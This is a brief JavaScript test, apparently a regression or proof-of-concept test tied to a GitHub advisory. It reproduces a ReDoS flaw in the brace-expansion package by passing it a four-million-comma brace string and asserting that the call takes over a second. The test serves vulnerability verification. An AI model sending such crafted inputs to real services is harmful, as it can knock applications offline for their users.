//https://github.com/advisories/GHSA-832h-xg76-4gv6
test("ReDos in brace-expansion", () => {
  const expand = require("brace-expansion");
  const measureTime = require("./utils").measureTime;
  const { genstr } = require("./utils");

  let attack_str = "{" + genstr(4000000, ",") + "\n}";
  let t = measureTime(function () {
    expand(attack_str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
